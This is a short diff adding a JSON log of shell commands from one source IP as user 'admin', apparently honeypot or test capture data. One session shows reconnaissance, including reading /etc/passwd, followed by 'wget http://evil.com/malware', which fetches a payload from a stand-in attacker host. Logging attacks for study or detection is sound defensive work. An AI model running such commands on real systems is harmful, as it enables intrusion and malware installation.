@@ -1,0 +1,12 @@
+{"type": "command", "timestamp": "2026-02-09T22:23:02.491545", "source_ip": "192.168.65.1", "username": "admin", "command": "ls"}
+{"type": "command", "timestamp": "2026-02-09T22:23:05.070714", "source_ip": "192.168.65.1", "username": "admin", "command": "whoami"}
+{"type": "command", "timestamp": "2026-02-09T22:23:12.347141", "source_ip": "192.168.65.1", "username": "admin", "command": "cat /etc/passwd"}
+{"type": "command", "timestamp": "2026-02-09T22:23:20.478253", "source_ip": "192.168.65.1", "username": "admin", "command": "wget http://evil.com/malware"}
+{"type": "command", "timestamp": "2026-02-09T22:23:24.874120", "source_ip": "192.168.65.1", "username": "admin", "command": "exit"}
+{"type": "command", "timestamp": "2026-02-10T05:36:04.864163", "source_ip": "192.168.65.1", "username": "admin", "command": "ls"}
+{"type": "command", "timestamp": "2026-02-10T05:36:06.980436", "source_ip": "192.168.65.1", "username": "admin", "command": "cat"}
+{"type": "command", "timestamp": "2026-02-10T05:36:09.226824", "source_ip": "192.168.65.1", "username": "admin", "command": "ls"}
+{"type": "command", "timestamp": "2026-02-10T05:36:10.689102", "source_ip": "192.168.65.1", "username": "admin", "command": "ls"}
+{"type": "command", "timestamp": "2026-02-10T05:36:15.628469", "source_ip": "192.168.65.1", "username": "admin", "command": "uname"}
+{"type": "command", "timestamp": "2026-02-10T05:36:17.407908", "source_ip": "192.168.65.1", "username": "admin", "command": "whoami"}
+{"type": "command", "timestamp": "2026-02-10T05:36:34.370633", "source_ip": "192.168.65.1", "username": "admin", "command": "exit"}
